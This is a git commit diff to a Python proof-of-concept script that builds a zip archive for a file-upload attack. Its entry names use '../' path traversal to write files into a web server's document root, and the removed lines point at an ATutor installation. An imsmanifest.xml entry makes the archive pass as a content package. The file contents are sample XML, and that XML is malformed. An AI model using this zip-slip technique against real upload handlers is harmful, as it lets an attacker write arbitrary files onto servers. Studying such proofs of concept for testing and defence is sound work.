30b0c8ef3fef059cffcb43eccadd34986ce8e018
rortega <ortega.r.rafael@gmail.com>
2024-01-11 13:44:45 -0600

    Update zip.py

--- FileUpload_zip/zip.py
+++ FileUpload_zip/zip.py
@@ -5,8 +5,8 @@ def create_zip_in_memory():
     memory_zip = io.BytesIO()
 
     with zipfile.ZipFile(memory_zip, mode='w') as zf:
-        zf.writestr('../../../../../var/www/html/ATutor/xxx/poc/xadmin.xml', 'encoding="UTF-8"?>to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Dont forget me this weekend!</body></note>')
-        zf.writestr('../../../../../var/www/html/ATutor/xxx/poc/admin.xml', '<?xml version="1.0" encoding="UTF-8"?>to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Dont forget me this weekend!</body></note>')
+        zf.writestr('../../../../../var/www/html/xxxr/xxx/poc/xadmin.xml', 'encoding="UTF-8"?>to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Dont forget me this weekend!</body></note>')
+        zf.writestr('../../../../../var/www/html/xxx/xxx/poc/admin.xml', '<?xml version="1.0" encoding="UTF-8"?>to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Dont forget me this weekend!</body></note>')
         zf.writestr('imsmanifest.xml', '<?xml version="1.0" encoding="UTF-8"?>to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Dont forget me this weekend!</body></note>')
 
     # move to the beginning of the in-memory by stream
